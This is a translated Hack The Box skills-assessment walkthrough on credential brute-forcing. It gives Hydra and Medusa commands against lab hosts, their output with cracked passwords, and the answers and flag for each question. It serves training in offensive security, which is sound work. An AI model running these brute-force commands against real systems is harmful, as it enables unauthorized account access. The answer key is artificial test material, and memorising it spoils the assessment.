Aquí tienes **todo el contenido traducido al inglés**, manteniendo **estructura, comandos, bloques y respuestas exactamente iguales** (solo cambia el idioma).

---

The first part of the skills assessment will require you to brute-force the target instance. Successfully finding the correct login will provide you with the username needed to begin **Skills Assessment Part 2**.

The following wordlists may be useful during this engagement:
[usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and
[passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

### Hydra command:

```java
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
-P /usr/share/wordlists/2023-200_most_used_passwords.txt \
83.136.250.108 http-get / -s 42774
```

```css
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-04 17:21:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-get://83.136.250.108:42774/
[42774][http-get] host: 83.136.250.108   login: admin   password: Admin123
[STATUS] 1315.00 tries/min, 1315 tries in 00:01h, 2085 to do in 00:02h, 16 active
```

---

### Questions

**1. What is the password for the basic authentication login?**

> Admin123

**2. After successfully brute-forcing the login, what is the username you are given for the next part of the skills assessment?**

> satwossh

---

## Skills Assessment Part 2

This is the second part of the skills assessment.
`YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`.

Use the username provided after completing Part 1 to brute-force the login on the target instance.

### Medusa

```ruby
medusa -h 83.136.253.132 -n 56052 -u satwossh \
-P /usr/share/wordlists/2023-200_most_used_passwords.txt \
-M ssh -t 6
```

```text
ACCOUNT FOUND: [ssh] Host: 83.136.253.132 User: satwossh Password: password1 [SUCCESS]
```

---

### Questions

**1. What is the username of the FTP user you find via brute force?**

> thomas

**2. What is the flag contained in `flag.txt`?**

> HTB{brut3f0rc1ng_succ3ssful}


